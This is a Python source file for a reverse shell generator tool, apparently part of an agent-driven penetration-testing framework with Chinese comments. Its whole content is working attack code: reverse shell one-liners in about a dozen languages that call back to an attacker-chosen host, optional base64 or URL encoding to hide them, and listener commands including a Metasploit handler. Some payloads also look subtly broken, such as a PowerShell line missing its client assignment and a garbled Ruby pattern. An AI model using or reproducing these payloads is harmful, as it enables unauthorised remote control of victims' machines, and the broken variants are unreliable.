#!/usr/bin/env python3
"""
反向Shell生成工具
"""

import base64
import urllib.parse
from typing import Any, Dict, List
from dataclasses import dataclass, field

from core.tool_registry import BaseTool, ToolCategory, ToolParameter


@dataclass
class ReverseShellTool(BaseTool):
    """反向Shell生成器"""
    name: str = "reverse_shell"
    description: str = "反向Shell生成器 - 生成各类反向Shell命令"
    category: ToolCategory = ToolCategory.EXPLOIT
    parameters: List[ToolParameter] = field(default_factory=lambda: [
        ToolParameter("lhost", "string", "监听地址", required=True),
        ToolParameter("lport", "integer", "监听端口", required=True),
        ToolParameter("shell_type", "string", "Shell类型", required=True,
                     choices=["bash", "sh", "python", "python3", "php", "perl", 
                             "ruby", "nc", "ncat", "powershell", "java", "nodejs"]),
        ToolParameter("encode", "string", "编码方式", required=False, default="",
                     choices=["", "base64", "url"]),
    ])
    timeout: int = 10
    
    def execute(self, params: Dict[str, Any], session_id: str = None) -> Dict[str, Any]:
        lhost = params["lhost"]
        lport = params["lport"]
        shell_type = params["shell_type"]
        encode = params.get("encode", "")
        
        shells = self._generate_shells(lhost, lport)
        
        if shell_type not in shells:
            return {
                "success": False,
                "error": f"不支持的Shell类型: {shell_type}"
            }
        
        shell_variants = shells[shell_type]
        
        # 编码
        if encode:
            encoded_shells = []
            for shell in shell_variants:
                encoded = self._encode_shell(shell["command"], encode)
                encoded_shells.append({
                    **shell,
                    "encoded": encoded,
                    "encode_type": encode
                })
            shell_variants = encoded_shells
        
        # 生成监听命令
        listener = self._get_listener_command(lhost, lport)
        
        return {
            "success": True,
            "lhost": lhost,
            "lport": lport,
            "shell_type": shell_type,
            "shells": shell_variants,
            "listener": listener,
            "note": "先在攻击机运行监听命令，再在目标机执行反向Shell命令"
        }
    
    def _generate_shells(self, lhost: str, lport: int) -> Dict[str, List[Dict[str, str]]]:
        """生成所有类型的反向Shell"""
        return {
            "bash": [
                {
                    "name": "Bash -i",
                    "command": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
                },
                {
                    "name": "Bash 5",
                    "command": f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
                },
                {
                    "name": "Bash UDP",
                    "command": f"bash -i >& /dev/udp/{lhost}/{lport} 0>&1"
                }
            ],
            "sh": [
                {
                    "name": "sh -i",
                    "command": f"/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"
                },
                {
                    "name": "sh via exec",
                    "command": f"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done"
                }
            ],
            "python": [
                {
                    "name": "Python 2",
                    "command": f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
                }
            ],
            "python3": [
                {
                    "name": "Python 3",
                    "command": f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''
                },
                {
                    "name": "Python 3 short",
                    "command": f'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")\''
                }
            ],
            "php": [
                {
                    "name": "PHP exec",
                    "command": f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\''
                },
                {
                    "name": "PHP system",
                    "command": f'php -r \'$sock=fsockopen("{lhost}",{lport});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\''
                }
            ],
            "perl": [
                {
                    "name": "Perl",
                    "command": f'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
                },
                {
                    "name": "Perl no sh",
                    "command": f'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{lhost}:{lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''
                }
            ],
            "ruby": [
                {
                    "name": "Ruby",
                    "command": f'ruby -rsocket -e\'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
                },
                {
                    "name": "Ruby no sh",
                    "command": f'ruby -rsocket -e\'exit if fork;c=TCPSocket.new("{lhost}",{lport});loop{{c.gets.chomp!;(exit! if $_=="exit");($_=~/444444/444?):(IO.popen($_,?r){{|io|c.print io.read}})}}\''
                }
            ],
            "nc": [
                {
                    "name": "Netcat -e",
                    "command": f"nc -e /bin/sh {lhost} {lport}"
                },
                {
                    "name": "Netcat -c",
                    "command": f"nc -c /bin/sh {lhost} {lport}"
                },
                {
                    "name": "Netcat pipe",
                    "command": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
                }
            ],
            "ncat": [
                {
                    "name": "Ncat",
                    "command": f"ncat {lhost} {lport} -e /bin/sh"
                },
                {
                    "name": "Ncat SSL",
                    "command": f"ncat --ssl {lhost} {lport} -e /bin/sh"
                }
            ],
            "powershell": [
                {
                    "name": "PowerShell",
                    "command": f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
                },
                {
                    "name": "PowerShell Base64",
                    "command": f'powershell -e {self._ps_base64(lhost, lport)}'
                }
            ],
            "java": [
                {
                    "name": "Java Runtime",
                    "command": f'r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()'
                }
            ],
            "nodejs": [
                {
                    "name": "Node.js",
                    "command": f"(function(){{var net = require('net'),cp = require('child_process'),sh = cp.spawn('/bin/sh', []);var client = new net.Socket();client.connect({lport}, '{lhost}', function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})()"
                }
            ]
        }
    
    def _ps_base64(self, lhost: str, lport: int) -> str:
        """生成PowerShell Base64编码"""
        ps_script = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'
        return base64.b64encode(ps_script.encode('utf-16-le')).decode()
    
    def _encode_shell(self, command: str, encode_type: str) -> str:
        """编码Shell命令"""
        if encode_type == "base64":
            return base64.b64encode(command.encode()).decode()
        elif encode_type == "url":
            return urllib.parse.quote(command)
        return command
    
    def _get_listener_command(self, lhost: str, lport: int) -> Dict[str, str]:
        """获取监听命令"""
        return {
            "nc": f"nc -lvnp {lport}",
            "ncat": f"ncat -lvnp {lport}",
            "ncat_ssl": f"ncat --ssl -lvnp {lport}",
            "socat": f"socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:/bin/bash",
            "msfconsole": f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run'"
        }
